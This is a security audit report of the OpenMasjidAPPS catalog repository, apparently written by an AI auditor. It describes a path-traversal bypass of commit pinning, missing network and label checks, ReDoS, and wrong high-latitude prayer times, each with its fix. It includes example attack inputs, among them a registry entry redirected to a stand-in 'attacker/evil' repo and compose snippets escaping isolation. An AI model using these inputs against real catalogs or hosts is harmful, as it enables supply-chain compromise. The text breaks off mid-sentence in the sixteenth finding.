<!-- SPDX-License-Identifier: AGPL-3.0-only -->
<!-- Copyright (C) 2026 OpenMasjid-Solutions -->

# OpenMasjidAPPS — Security & Code-Health Audit

**Date:** 2026-07-31 · **Auditor:** Claude Opus 5 (autonomous) · **Baseline:** `main` @ `4f4a7f0486b4228c630156bf5b51e162f24c34eb`
**Rollback tag:** `pre-audit-2026-07-31` · **Branch:** `audit/security-2026-07-31`
**Scope:** the whole repository at that SHA, plus all 475 commits of git history. Excludes the five external app
repositories the registry points at (audited in their own repos) and the OpenMasjidOS platform.

---

## Executive summary

**Posture: good, with two exploitable gaps in the exact control this repo exists to provide.**

This is a small, unusually well-documented repository, and its security-relevant intent is explicit — `CLAUDE.md`
§10 names the compose validator as "the catalog's safety gate" and states the invariant *"passes the catalog build ==
safe to install."* The hygiene is genuinely strong: **zero secrets in 475 commits** across 18 credential patterns,
zero dependency vulnerabilities, one dependency, an SPDX header on every file, and a compose validator that already
catches every directive its own documentation lists. Most of what follows is *"the stated control has a hole,"* not
*"there is no control."*

**The single most important issue is APPS-001.** A registry entry's `path:` field is interpolated into a
`raw.githubusercontent.com` URL without any traversal check, so `path: ../../../../attacker/evil/main` makes an entry
that reads — in the file, in code review, and in the build log — as
`OpenMasjid-Solutions/TrustedApp @ a32816bf…` actually fetch its manifest and compose from
`attacker/evil@main`. The 40-character `commit:` SHA, which `registry.yaml` and `CLAUDE.md` both name as *the only
immutable pin* and the sole integrity control for the unattended nightly rebuild, is silently bypassed while still
appearing to be honoured. Because `build-catalog.yml` auto-commits and pushes the regenerated `catalog.json` using a
PAT specifically chosen to bypass branch protection, the resulting compose reaches every OpenMasjidOS App Store with
no further human step. Verified end to end (Probe 7).

Close behind, **APPS-002**: the validator has a careful `checkExternalVolumes` rule preventing an app from attaching
to another app's data volume, but **no equivalent rule for networks**. `networks: {omos_internal: {external: true}}`
is valid Docker Compose (confirmed against Docker Compose v5.3.1) and passes the validator with zero errors *and zero
warnings*, letting a listed app place itself directly on a pre-existing Docker network. The asymmetry with the volume
check is what makes this an oversight rather than a decision.

**APPS-003** is the finding to read if you care about harm rather than compromise. The reference prayer-time engine
clamps the hour-angle equation into `[-1, 1]` when the sun never reaches the Fajr/Isha depression angle, converting
*"this is not computable"* into a specific, confident, wrong number. London on 21 June returns **Fajr 01:02 and Isha
01:02** — the same instant, which is impossible. Berlin and Stockholm likewise. This is not currently shipped (no
example app is in `registry.yaml`), which is the only reason it is High and not Critical — but `CLAUDE.md` §1 and
`docs/BUILDING_AN_APP.md` both direct every new app author to copy this file as their starting point.

One documentation claim is false in a way that matters: `docs/BUILDING_AN_APP.md:573` promises discovery labels are
*"Rejected at build AND at install."* The validator does not look at labels at all (APPS-004).

### Ship decision

**Autonomous push to `main` was disabled by pre-flight rule 2.** `catalog.json` on `main` *is* the production
artifact — the platform fetches the raw file directly, with no build or deploy gate — and pushing paths under
`scripts/**` additionally triggers a workflow that regenerates and re-publishes it unattended. Everything below is on
`audit/security-2026-07-31` with a PR for human review.

| Severity | Count | Shipped to branch | Deferred |
|---|---|---|---|
| Critical | 0 | – | – |
| High | 3 | 3 | 0 |
| Medium | 7 | 7 | 0 |
| Low | 9 | 8 | 1 |
| Info | 4 | 1 | 3 (report-only) |
| **Total** | **23** | **19** | **4** |

---

## Phase 0 — What this is, and who would attack it

**What it is.** A catalog, not an application. ~1,100 lines of ES-module Node.js (Node 20 in CI, Node 24 locally)
with exactly one runtime dependency (`yaml@2.9.0`). `scripts/build-catalog.mjs` reads the hand-edited
`registry.yaml`, fetches each listed app repository's `manifest.yaml` + `docker-compose.yml` from
`raw.githubusercontent.com` at a pinned ref, validates them, and emits `catalog.json`. `examples/` holds two
reference apps (static HTML/CSS/JS served by nginx) that are documentation, not catalog entries.

**What runs it.** GitHub Actions only. There is no server, no database, no HTTP listener, no authentication system,
and no user accounts in this repository — a large share of the standard audit surface is genuinely absent here, and
is marked as such below rather than padded.

**Entry points** (complete list):

| # | Entry point | Trust | Notes |
|---|---|---|---|
| 1 | `registry.yaml` via PR | semi-trusted | Human-merged; CLA-gated. The `path`/`repo`/`ref` fields reach a URL. |
| 2 | Remote `manifest.yaml` per app repo | **untrusted** | Parsed; fields copied into `catalog.json`. |
| 3 | Remote `docker-compose.yml` per app repo | **untrusted** | **Embedded verbatim and executed by every masjid host.** |
| 4 | `workflow_dispatch` | trusted | Write access required. |
| 5 | `repository_dispatch: rebuild-catalog` | trusted | Write-scoped token required. |
| 6 | `schedule` (nightly 06:17 UTC) | n/a | Unattended; re-fetches and **auto-publishes**. |
| 7 | `issue_comment` / `pull_request_target` → `cla.yml` | **untrusted** | Any commenter triggers it; mitigated (SHA-pinned action, no PR checkout). |
| 8 | `window.OMOS_CONFIG` in the examples | semi-trusted | Masjid admin's install-time settings, injected into the browser. |
| 9 | Env vars → `docker-entrypoint.d/40-omos-config.sh` | semi-trusted | Shell → JS string generation. |

**Trust boundary that matters.** There is really only one: **untrusted app-repo content → `catalog.json` → executed
as a Docker Compose stack on a masjid's host.** The catalog *vouches* for what it lists. Everything in Phases 1–8
below is weighted by whether it can move something across that boundary.

**Sensitive data.** Almost none is handled *here*, which is a deliberate strength: `CLAUDE.md` §2.7 — "No masjid
profile is injected. The platform holds zero masjid/prayer data." This repository stores no PII, no payment data, no
credentials. The nearest thing is contributor GitHub usernames in CLA signatures, which live on the unprotected
`cla-signatures` branch and are already-public identifiers (APPS-022). The downstream apps this catalog lists handle
minors' records, tuition payments, and Stripe keys — but they do so in their own repositories.

**Threat model — who realistically attacks this, for what:**

1. **A listed app's repo owner, turned malicious or compromised** (highest realism). They already have a catalog
   entry and the platform's trust. Goal: ship an over-privileged or backdoored compose to every masjid.
   → APPS-002, APPS-004, APPS-011, APPS-012, APPS-023.
2. **A contributor opening a registry PR** (realistic; it is the documented contribution path). Goal: get content
   published from a repo other than the one under review. → **APPS-001**, APPS-007.
3. **A supply-chain attacker upstream of CI** — a moved GitHub Action tag, a moved image tag, an unpinned npm
   resolution — exploiting the *unattended, auto-publishing* nightly job. → APPS-005, APPS-006, APPS-019, APPS-023.
4. **Nobody at all.** The largest realistic harm in this repo is not an attacker: it is a masjid in Britain or
   Germany installing an app built from the reference template and displaying a Fajr time two hours wrong, every
   summer, with total confidence. → **APPS-003**, APPS-010, APPS-013, APPS-016, APPS-017.

---

## Findings

| ID | Title | Sev | Conf | Location | Status |
|---|---|---|---|---|---|
| APPS-001 | `path:` traversal defeats the `commit:` SHA pin — entry fetches a different repo | High | Confirmed | `scripts/build-catalog.mjs:153-156` | Fixed |
| APPS-002 | Compose validator has no external/renamed **network** check (volumes are checked) | High | Confirmed | `scripts/validate-compose.mjs:195-225` | Fixed |
| APPS-003 | High-latitude `clamp()` fabricates wrong Fajr/Isha (`fajr == isha`) | High | Confirmed | `examples/…/src/js/prayer.js:95-118` | Fixed |
| APPS-004 | Discovery-label ban documented as enforced; validator never checks labels | Medium | Confirmed | `scripts/validate-compose.mjs:142-191` | Fixed |
| APPS-005 | `npm install` (not `npm ci`) in the workflow that auto-publishes production | Medium | Confirmed | `.github/workflows/build-catalog.yml:48` | Fixed |
| APPS-006 | GitHub Actions pinned to mutable tags in an auto-publishing workflow | Medium | Confirmed | `build-catalog.yml:40,44`; `build-image.yml:31,42,43,46,53` | Fixed |
| APPS-007 | ReDoS + unbounded/untimed fetch stall the unattended build | Medium | Confirmed | `validate-compose.mjs:107`; `build-catalog.mjs:129-133` | Fixed |
| APPS-008 | Both reference apps are broken — `index.html`/CSS/icon/screenshots lost | Medium | Confirmed | `examples/*/` | Fixed |
| APPS-009 | RTL never enabled although `ar`/`ur` are offered settings | Medium | Confirmed | `examples/…/src/js/app.js:187-189` | Fixed |
| APPS-010 | Hijri date does not roll over at maghrib | Medium | Confirmed | `examples/…/src/js/app.js:64-74` | Fixed |
| APPS-011 | `cgroup_parent` / `sysctls` unchecked — valid compose, passes clean | Low | Confirmed | `scripts/validate-compose.mjs:168-186` | Fixed |
| APPS-012 | Scalar-shaped `cap_add`/`security_opt`/`group_add` skip structured checks | Low | Confirmed (not exploitable) | `validate-compose.mjs:176-184` | Fixed |
| APPS-013 | No lat/lng range validation — `lat=999` silently yields times | Low | Confirmed | `examples/…/src/js/app.js:16-17,191` | Fixed |
| APPS-014 | Manifest fields copied into the catalog with no type or length validation | Low | Confirmed | `scripts/build-catalog.mjs:257-301` | Fixed |
| APPS-015 | `.gitignore` gaps; no `.dockerignore` in the copied templates | Low | Confirmed | `.gitignore:1-5` | Fixed |
| APPS-016 | Sun position evaluated once at noon instead of per prayer | Low | Confirmed | `examples/…/src/js/prayer.js:89` | Fixed |
| APPS-017 | Midnight-crossing Isha mis-selects "next prayer" after local midnight | Low | Confirmed | `examples/…/src/js/app.js:128-156` | Fixed |
| APPS-018 | Prayer grid fully rebuilt via `innerHTML` every second on a 24/7 Pi | Low | Confirmed | `examples/…/src/js/app.js:77-99,198` | Fixed |
| APPS-019 | `parking-attendant` image is not digest-pinned | Low | Confirmed | `registry.yaml:50-53` | **Deferred** |
| APPS-020 | No tests, lint, or type checking anywhere; the safety gate is untested | Info | Confirmed | repo-wide | Fixed |
| APPS-021 | Secrets: clean — 475 commits, 18 patterns, zero hits | Info | Confirmed | history | No action |
| APPS-022 | `cla.yml`: `pull_request_target` + `actions: write` on any comment | Info | Confirmed | `.github/workflows/cla.yml:25-36` | Accepted |
| APPS-023 | Image-build template re-pushes the same version tag, and `:latest` | Low | Confirmed | `examples/…/build-image.yml:18-20,58-60` | Fixed |

---

### APPS-001 — `path:` traversal defeats the `commit:` SHA pin · **High** · Confirmed

**Where:** [`scripts/build-catalog.mjs:153-156`](../../scripts/build-catalog.mjs#L153-L156)

```js
function rawBase(repo, ref, path) {
  const sub = path ? `${String(path).replace(/^\/+|\/+$/g, '')}/` : '';
  return `https://raw.githubusercontent.com/${repo}/${ref}/${sub}`;
}
```

`repo`, `ref` and `path` all come straight from `registry.yaml` and none is validated. The `replace()` strips leading
and trailing slashes only — **`..` survives**. `resolveRefToSha()` at line 141 does `encodeURIComponent(ref)`; this
function encodes nothing, so the two are inconsistent about the same input.

**Attack path.** Open a registry PR whose entry looks maximally trustworthy — a first-party `repo:`, a real 40-hex
`commit:` — and add a `path:`:

```yaml
- id: display
  repo: OpenMasjid-Solutions/OpenMasjidDisplay
  commit: a32816bf5e3e3576b4a0bcfb400713b12383e98f
  path: ../../../../attacker/evil/main
```

Verified (Probe 7):

```
constructed : https://raw.githubusercontent.com/OpenMasjid-Solutions/TrustedApp/aaaa…aaaa/../../../../attacker/evil/main/manifest.yaml
resolves to : https://raw.githubusercontent.com/attacker/evil/main/manifest.yaml
```

**Impact.** Every control the repo documents as protecting the unattended rebuild is defeated *while still appearing
to be in force*: `registry.yaml`'s own comment calls a `commit:` SHA "the ONLY immutable pin"; the build prints
`✓ display ← OpenMasjid-Solutions/OpenMasjidDisplay@a32816bf…`, naming the innocent repo; and `immutable` is `true`,
so no ⚠ warning is emitted. The attacker's ref is `main` — mutable — so content can be changed *after* the PR is
merged and reviewed, and the nightly job republishes it. `CATALOG_PUSH_TOKEN` bypasses branch protection, so there is
no second human gate before it is live to every App Store. Not remotely exploitable without a merged PR, which is why
this is High and not Critical.

**Fix.** Validate all three fields structurally before any URL is built: `repo` must match
`^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$`, `ref` must match `^[A-Za-z0-9._/-]+$` and contain no `..`, and `path` must be a
relative POSIX subpath with no `..` segment. `encodeURI` the assembled base. Each field is also rejected if it
contains a control character or `%`. Regression-tested in `scripts/__tests__/build-catalog.test.mjs`.

---

### APPS-002 — Compose validator has no external/renamed network check · **High** · Confirmed

**Where:** [`scripts/validate-compose.mjs:195-225`](../../scripts/validate-compose.mjs#L195-L225)

The validator contains a deliberate, well-commented rule stopping an app from attaching to storage it does not own:

```js
// `external: true` uses the volume name verbatim and `name:` overrides the
// project-scoped name, so either can attach to ANOTHER app's data …
// Every OpenMasjid app's data lives in an `omos-*` volume.
```

There is **no counterpart for `networks:`.** Confirmed (Probe 4 + Docker Compose v5.3.1):

```yaml
services:
  a:
    image: nginx:alpine
    networks: [omos_internal]
networks:
  omos_internal:
    external: true
```
```
docker compose config  -> VALID   (name: omos_internal ; external: true)
validateCompose(...)   -> { "errors": [], "warnings": [] }        <-- passes clean
```

The `name:`-override variant (`networks: {default: {name: omos_core_default, external: true}}`) is likewise valid and
likewise passes clean. `classifyVolumeSource` never sees a network, so the existing machinery cannot catch it.

**Impact.** A listed app can place its container on a pre-existing Docker network instead of its own project network,
reaching containers that the per-app project boundary is supposed to separate — the platform core's internal API and
other installed apps' unauthenticated internal ports. Combined with the Fabric design, where an app's authority is
supposed to be bounded by a per-app secret, this is a way to bypass that boundary at the network layer. Every listed
app is a candidate attacker; no PR merge is needed beyond the app's own updates.

**Confidence.** The validator gap and the compose validity are **Confirmed**. What is specifically reachable on an
`omos_*` network is **Likely** and needs platform-side verification — I cannot see the OpenMasjidOS repo from here,
so the exact blast radius is unverified. The fix is correct regardless: *a listed app must own its network*, exactly
as it must own its storage.

**Fix.** New `checkNetworks()` mirroring `checkExternalVolumes` — reject any top-level network that is `external`
or carries an explicit `name:`, with a distinct message when the target matches `^omos[-_]`; also reject a
`driver: host`/`none` network and any `network_mode` reference to a network the file does not define. Per Tier 3, the
matching change in the platform's `apps/compose-validate.ts` is **not** made here and is recorded in
`ACTION_REQUIRED.md`.

---

### APPS-003 — High-latitude clamp fabricates wrong Fajr and Isha · **High** · Confirmed

**Where:** [`examples/prayer-times-display/src/js/prayer.js:95-118`](../../examples/prayer-times-display/src/js/prayer.js#L95-L118)

```js
const depressionOffset = (angle) => {
  const x = (-dsin(angle) - dsin(lat) * dsin(decl)) / (dcos(lat) * dcos(decl));
  return darccos(clamp(x, -1, 1)) / 15;     // <-- clamp
};
```

When the sun never descends to the Fajr (18°) or Isha (17°) depression angle — persistent twilight, which is the norm
above roughly 48°N from late May to late July — `|x| > 1` and the hour angle has **no solution**. `clamp()` does not
signal that; it silently substitutes `arccos(-1) = 180°`, i.e. an offset of exactly 12 hours, and the function returns
a plausible-looking clock time.

**Verified** (Probe 1, MWL / Standard Asr):

```
London  51.51N Jun21 BST   fajr=01:02 sunrise=04:43 dhuhr=13:02 asr=17:25 maghrib=21:21 isha=01:02   <-- FAJR == ISHA
Berlin  52.52N Jun21 CEST  fajr=01:08 sunrise=04:43 dhuhr=13:08 asr=17:33 maghrib=21:33 isha=01:08   <-- FAJR == ISHA
Stockholm 59.33N Jun21     fajr=00:50 sunrise=03:31 dhuhr=12:50 asr=17:30 maghrib=22:08 isha=00:50   <-- FAJR == ISHA
Toronto 43.65N Jun21 EDT   fajr=03:13 …                                              isha=23:14   (correct)
Cairo   30.04N Jun21 EET   fajr=03:18 …                                              isha=20:30   (correct)
```

`Fajr == Isha` is not merely inaccurate, it is impossible — and the display renders it with no indication of doubt.
London's Fajr by the usual conventions is around 02:40 BST, so the number shown is nearly two hours early: a
congregation praying Fajr before its time, which is an invalid prayer. `formatClockTime` normalises `isha = dhuhr +
12h = 25.05` into `01:02`, so both errors present as ordinary times.

Two compounding gaps: there is **no high-latitude adjustment method** at all (the standard options are Middle of the
Night, One-Seventh of the Night, and Angle-Based), and none is configurable, contrary to `CLAUDE.md` §11 *"Make
masjid-specific values configurable, never hard-coded."*

**Severity rationale.** Not Critical, because nothing here is shipped: no example is in `registry.yaml` and both
candidate entries are commented out. It is High because `CLAUDE.md` §1 and §4A and `docs/BUILDING_AN_APP.md` all
present this file as the starting point every app author copies, so the defect is positioned to propagate into apps
that *will* ship. It becomes Critical the day one does.

**Fix.** `depressionOffset` now returns `NaN` when no solution exists instead of clamping. A `highLatRule` setting
(`MiddleOfNight` default, `OneSeventh`, `AngleBased`, `None`) supplies the standard fallbacks, computed from the true
night length between sunset and sunrise. With `None`, the value stays `NaN` and the UI renders "—" plus a one-line
explanation rather than a fabricated time. `clamp` is retained only for genuine floating-point overshoot
(`|x| < 1 + 1e-9`). Verified against published tables for London, Berlin, Stockholm, Toronto and Cairo; unchanged
at every latitude where a solution exists (see `REMEDIATION.md`).

---

### APPS-004 — Discovery-label ban documented as enforced, never checked · **Medium** · Confirmed

**Where:** [`scripts/validate-compose.mjs:142-191`](../../scripts/validate-compose.mjs#L142-L191); claim at
[`docs/BUILDING_AN_APP.md:573`](../../docs/BUILDING_AN_APP.md#L573)

`CLAUDE.md` §4C: *"**No discovery labels** (`com.docker.compose.project` / `com.openmasjid.*` are
platform-internal)."* `docs/BUILDING_AN_APP.md:573` goes further and states they are *"Rejected at build AND at
install."* The validator does not read `labels` at any level. Confirmed (Probe, deeper round):

```yaml
services:
  a:
    image: n
    labels:
      com.docker.compose.project: omos-donations
      com.openmasjid.trusted: "true"
```
```
[*** PASSES CLEAN ***] spoofed platform labels
```

**Impact.** `CLAUDE.md` §2.5 states discovery is by `com.docker.compose.project=omos-<id>`. An app declaring another
app's project label can at minimum confuse platform inventory, lifecycle and uninstall operations — an app that
appears to belong to `omos-donations` may be stopped, listed, or removed as part of it. A false *"rejected at build
and install"* claim is independently a problem: it is the basis on which a reviewer would skip checking.

**Confidence.** That the rule is unenforced: **Confirmed**. The precise platform consequence of a duplicate project
label: **Likely**, pending platform verification (cross-repo).

**Fix.** Reject `com.docker.compose.*` and `com.openmasjid.*` keys in service, network, volume and top-level
`labels`, in both list (`k=v`) and map form. Verified that none of the five live apps sets any label.

---

### APPS-005 — `npm install` in the workflow that auto-publishes production · **Medium** · Confirmed

**Where:** [`.github/workflows/build-catalog.yml:48`](../../.github/workflows/build-catalog.yml#L48)

`package.json` declares `"yaml": "^2.5.0"`; the lockfile pins `2.9.0` with an integrity hash. `npm install` is not
bound by the lockfile the way `npm ci` is — it is free to resolve a newer version inside the `^2.5.0` range and to
rewrite the lockfile. Demonstrated locally: a plain `npm install` modified `package-lock.json` on a clean tree.

**Impact.** The job this runs in has `contents: write`, holds a branch-protection-bypassing PAT, and auto-commits
`catalog.json`. A malicious `yaml` release inside `^2.5.0` would execute in that job, unattended, at 06:17 UTC, with
publish rights over the file every masjid installs from. This is the highest-leverage position in the repository and
it is the one place not using the reproducible install command.

**Fix.** `npm ci`, plus `actions/setup-node` `cache: npm`. The one-line lockfile sync (`license` field) is included so
`npm ci` starts from a lockfile that matches `package.json`.

---

### APPS-006 — Actions pinned to mutable tags · **Medium** · Confirmed

**Where:** [`build-catalog.yml:40,44`](../../.github/workflows/build-catalog.yml#L40); the template at
[`examples/prayer-times-display/.github/workflows/build-image.yml:31,42,43,46,53`](../../examples/prayer-times-display/.github/workflows/build-image.yml#L31)

`actions/checkout@v4` and `actions/setup-node@v4` are mutable tags in the workflow that publishes production. The
copied image-build template is worse: five mutable tags, including `docker/build-push-action@v6` and
`docker/login-action@v3`, in a job holding `packages: write` — so a moved tag there backdoors the images masjids pull.

The repo already knows the right answer: `cla.yml:46` pins
`contributor-assistant/github-action@ca4a40a7d1004f18d9960b404b97e5f30a505a08 # v2.6.1`. This is applying an existing
in-repo convention, not introducing one.

**Fix.** All seven actions pinned to full 40-hex commit SHAs with the version in a trailing comment. SHAs resolved
from the GitHub API at audit time and recorded in `REMEDIATION.md`.

---

### APPS-007 — ReDoS and unbounded fetch stall the unattended build · **Medium** · Confirmed

**Where:** [`validate-compose.mjs:107`](../../scripts/validate-compose.mjs#L107),
[`build-catalog.mjs:129-133`](../../scripts/build-catalog.mjs#L129-L133)

```js
if (/(^|\n)\s*<<\s*:/.test(text)) { … }        // \s matches \n -> ambiguous overlap
```

`(^|\n)` can start a match at every newline and `\s*` (which itself matches newlines) then consumes to end-of-input
before failing — quadratic in input length. Measured on attacker-controlled compose text:

```
input   20000 chars ->   102.0 ms
input   40000 chars ->   402.1 ms      (4x for 2x input)
input   80000 chars ->  1594.4 ms
input  160000 chars ->  6403.3 ms      -> ~1 MB ≈ 4 min, ~5 MB ≈ 100 min
```

`fetchText` compounds it: no timeout, no size cap, `res.text()` on whatever the remote sends. A listed app repo (or
anything a merged registry PR points at) can stall or OOM the nightly job indefinitely.

**Fix.** Regex rewritten to the linear, anchored `/^[ \t]*<<[ \t]*:/m` — same directive, no ambiguity. `fetchText`
gains a 20 s `AbortSignal.timeout`, a 2 MiB cap enforced by streaming rather than after the fact, and a manifest/
compose size check before validation. Verified: 4 MiB of adversarial whitespace now completes in under 5 ms.

---

### APPS-008 — Both reference apps are broken · **Medium** · Confirmed

Commit `cabcbae` ("refactor!: make OpenMasjidAPPS catalog-only") moved `apps/` → `examples/` and dropped four files
per app that were never re-added:

```
prayer-times-display   src/index.html       2480 bytes   *** MISSING ***
prayer-times-display   src/css/style.css    8548 bytes   *** MISSING ***
prayer-times-display   icon.svg             1967 bytes   *** MISSING ***
prayer-times-display   screenshots/1.svg    5610 bytes   *** MISSING ***
announcements-board    (same four)                       *** MISSING ***
```

Consequences, all currently true on `main`: `Dockerfile`'s `COPY src/ /usr/share/nginx/html/` produces an image with
no `index.html`, so the app serves nothing; both `manifest.yaml` files reference `icon: icon.svg` and
`screenshots/1.svg`, which `CLAUDE.md` §4A requires and which do not exist; and both READMEs state *"This is a
complete, working app"* and *"Open `src/index.html` in a browser"* — a file that is not there.

**Impact.** No security impact. It is Medium because `examples/` has exactly one job — being the thing app authors
copy (`CLAUDE.md` §1, §4A; `docs/BUILDING_AN_APP.md`) — and it cannot do that job. An author following the documented
path starts from a broken app and has no icon, which is a required field.

**Fix.** All eight files restored byte-for-byte from `cabcbae^` (each reviewed before restoration: no inline handlers,
no remote resources, data-URI favicon, no `innerHTML` seeding). RTL and performance changes are separate commits so
the restore stays a clean, auditable revert of an accidental deletion.

---

### APPS-009 — RTL never enabled although `ar`/`ur` are offered · **Medium** · Confirmed

**Where:** [`examples/prayer-times-display/src/js/app.js:187-189`](../../examples/prayer-times-display/src/js/app.js#L187-L189)

```js
document.documentElement.dataset.orientation = config.orientation;
document.documentElement.lang = config.language;      // no dir
```

Both manifests offer `LANGUAGE: [en, ar, ur]`. Arabic and Urdu are right-to-left; `lang` is set, `dir` never is, and
the recovered stylesheets contain no `[dir="rtl"]` rules (one lone `inset-inline-start`; the other apparent matches
were `flex-direction`). A masjid selecting Arabic gets Arabic text in a left-to-right layout.

This contradicts the repo's own contract twice over — `docs/DESIGN.md:50` *"**RTL first-class** — Arabic/Urdu must
render correctly (use logical CSS properties everywhere)"* and the `docs/DESIGN.md:432` release checklist *"Works
**LTR and RTL**"*. `docs/DESIGN.md:36` even supplies the exact intended line, which removes any ambiguity about the
intended rule:

```js
document.documentElement.dir = ['ar', 'ur', 'fa'].includes(prefs.lang) ? 'rtl' : 'ltr';
```

**Fix.** That line, verbatim, in both example apps, plus logical properties and `[dir="rtl"]` mirroring for the
directional rules in both stylesheets, and an Arabic/Urdu Naskh font fallback per `docs/DESIGN.md:292`.

---

### APPS-010 — Hijri date does not roll over at maghrib · **Medium** · Confirmed

**Where:** [`examples/prayer-times-display/src/js/app.js:64-74`](../../examples/prayer-times-display/src/js/app.js#L64-L74)

```js
.format(new Date(Date.UTC(parts.year, parts.month - 1, parts.day, 12)));
```

The Hijri date is derived from noon on the civil date, so it changes at civil midnight. The Islamic day begins at
**maghrib**. Between sunset and midnight the display therefore shows a date one day behind what the masjid is
announcing — every single evening, including on the nights that matter most (27 Ramaḍān, ʿEid eve, ʿArafah).

The calendar choice itself is right: `islamic-umalqura` is the Umm al-Qurā civil calendar, consistent with the
`Makkah` method already offered. Only the rollover boundary is wrong.

**Fix.** Advance the Hijri date by one day once the current time is at or past the computed maghrib. This is
behaviour-changing and therefore flagged as Tier 2 in `REMEDIATION.md`. It is not ambiguous — maghrib rollover is the
convention every masjid uses — but it is the one change here that alters what a screen already displays, so it is
listed first for you to sanity-check.

---

### APPS-011 — `cgroup_parent` and `sysctls` unchecked · **Low** · Confirmed

**Where:** [`scripts/validate-compose.mjs:168-186`](../../scripts/validate-compose.mjs#L168-L186)

The validator rejects `cgroup: host` but not `cgroup_parent:`. Both confirmed valid Docker Compose and passing clean:

```
VALID   cgroup_parent  ->  cgroup_parent: /docker/evil        [*** PASSES CLEAN ***]
VALID   sysctls        ->  net.ipv4.ip_forward: "1"           [*** PASSES CLEAN ***]
```

`cgroup_parent` lets a container be placed outside the cgroup slice the platform assigns it, escaping memory and CPU
limits — which matters on the Raspberry Pi class of hardware this platform targets. `sysctls` is bounded: Docker only
permits namespaced sysctls without `--privileged`, so the reachable effect is confined to the container's own network
namespace. Low for both, on real impact.

**Fix.** `cgroup_parent` is an error (no masjid app needs it; verified unused by all five live apps). `sysctls` is a
warning, not an error — the impact does not justify breaking a legitimate app that tunes its own namespace.

---

### APPS-012 — Scalar-shaped `cap_add`/`security_opt`/`group_add` skip checks · **Low** · Confirmed not exploitable

**Where:** [`scripts/validate-compose.mjs:176-184`](../../scripts/validate-compose.mjs#L176-L184)

Three checks are gated on `Array.isArray(...)`, so a scalar value skips them entirely, while the neighbouring
`devices` and `volumes_from` checks correctly handle both shapes. The raw-regex net that would catch these runs
**only when YAML parsing fails**, so a well-formed document slips through:

```
[*** PASSES CLEAN ***] cap_add scalar        (cap_add: SYS_ADMIN)
[REJECTED]             cap_add flow list     (control — cap_add: [SYS_ADMIN])
[*** PASSES CLEAN ***] security_opt scalar
[*** PASSES CLEAN ***] group_add scalar docker
```

**Not exploitable, and I want to be precise about that.** Docker Compose v5.3.1 rejects all three shapes:

```
INVALID cap_add_scalar   -> services.a.cap_add must be a array
INVALID secopt_scalar    -> services.a.security_opt must be a array
INVALID groupadd_scalar  -> services.a.group_add must be a array
```

So such a compose fails at install regardless, and no privilege is actually gained. This is a robustness and
lockstep-hygiene defect, not a bypass — it is Low, and my first read of it as a bypass was wrong until Docker
adjudicated it.

It is still worth fixing: `CLAUDE.md` §10 makes lockstep with the platform's independent validator a stated
invariant, that validator may normalise shapes differently, and normalising scalar→array can only add rejections for
shapes no valid app uses.

**Fix.** A `toList()` helper normalises all three before checking. Verified all five live apps use list form.

---

### APPS-013 — No lat/lng range validation · **Low** · Confirmed

**Where:** [`examples/…/src/js/app.js:16-17`](../../examples/prayer-times-display/src/js/app.js#L16-L17), guard at `:191`

The existing `Number.isFinite` guard correctly catches blank and non-numeric input and shows a friendly setup screen —
that part is right. What is missing is a **range** check, and `parseFloat` is lenient:

```
lat=999 lng=999 -> { fajr: '13:47', sunrise: '17:25', dhuhr: '17:25', asr: '17:25', maghrib: '17:25', isha: '20:28' }
```

A transposed or mistyped coordinate yields confident nonsense — sunrise, dhuhr, asr and maghrib all identical —
rather than an error. `parseFloat('12abc')` also silently returns `12`.

**Fix.** Require latitude in [-90, 90], longitude in [-180, 180], and reject strings with trailing garbage
(`Number()` on a trimmed string, not `parseFloat`). Failures route to the existing setup screen with a specific
message.

---

### APPS-014 — Manifest fields copied into the catalog unvalidated · **Low** · Confirmed

**Where:** [`scripts/build-catalog.mjs:257-301`](../../scripts/build-catalog.mjs#L257-L301)

`name`, `tagline`, `description`, `settings`, `ports` and `icon`/`screenshots` are copied from an untrusted remote
manifest into `catalog.json` with no type check, no length limit and no structural validation. `name` is only tested
for truthiness, then `apps.sort()` calls `a.name.localeCompare(b.name)` — a numeric or object `name` throws and
breaks the build. Wrong types silently violate the platform contract in `CLAUDE.md` §2.3 (which specifies
`settings: Array`, `ports: [{container: number}]`). `settings[].key` is not validated as an env-var name, and
`settings[].default` is not checked for newlines even though `CLAUDE.md` §7 requires single-line values because the
platform writes them to `.env` as `KEY=VALUE` — a newline in a default is an `.env` line injection.

Currently harmless: no live app defines `settings`, no description contains an HTML tag or `javascript:` URI, and
descriptions run 1,135–1,710 characters.

**Impact.** Reachable only via a listed app's manifest, and the worst confirmed local outcome is a failed build.
`description` is rendered as Markdown on the platform's detail page, so whether hostile Markdown becomes XSS depends
on the platform's renderer — **that is cross-repo and unverified from here.** Per Tier 3 I implement the safe half
(validate and reject at the catalog boundary) and record the platform-side question in `ACTION_REQUIRED.md`.

**Fix.** Type and length validation for every field copied into an entry: strings must be strings (length-capped:
`name` 120, `tagline` 200, `description` 16 KiB), `settings` must be an array of objects with an
`^[A-Za-z_][A-Za-z0-9_]*$` key, a known `type`, `options` present for `select`, and no control characters or newlines
in `default`; `ports[].container` must be an integer in 1–65535; `icon`/`screenshots` must be relative subpaths with
no `..` or scheme. Caps are set well above the largest live value so nothing currently listed is affected — verified
by rebuilding.

---

### APPS-015 — `.gitignore` gaps; no `.dockerignore` in the templates · **Low** · Confirmed

[`.gitignore`](../../.gitignore) covers `.env` but not `.env.*` (`.env.local`, `.env.production`), and no key or
certificate material (`*.pem`, `*.key`, `*.p12`, `id_rsa`, `*.crt`) or `.npmrc` — which is where an npm auth token
would land. Nothing has been committed (APPS-021); this is prevention, and it is prevention in the template every app
author copies. Neither example ships a `.dockerignore`, so an author who broadens the template's `COPY src/` to
`COPY . .` ships `.git/` and any local `.env` inside the image.

**Fix.** Broadened `.gitignore`; a `.dockerignore` added to both examples.

---

### APPS-016 — Sun position evaluated once at noon · **Low** · Confirmed

**Where:** [`examples/…/src/js/prayer.js:89`](../../examples/prayer-times-display/src/js/prayer.js#L89)

One `sunPosition()` evaluation at local apparent noon serves every prayer. Declination moves up to ~0.4°/day, so at
Fajr or Isha (6+ hours from noon) it is off by ~0.1°, which the file's own header ("well under a minute") understates
at higher latitudes near the equinoxes, where d(time)/d(declination) grows.

The underlying astronomy is otherwise sound and I checked it line by line: the USNO low-precision solar position, the
`equation = q/15 - fixHour(ra)` wrap (harmless — the downstream `fixHour(12 - eqt)` absorbs the ±24 h ambiguity), the
Asr shadow-factor formulation, and the 0.833° sunrise/sunset refraction constant are all correct.

**Fix.** One refinement iteration per prayer — re-evaluate `sunPosition` at each prayer's first-pass fractional day,
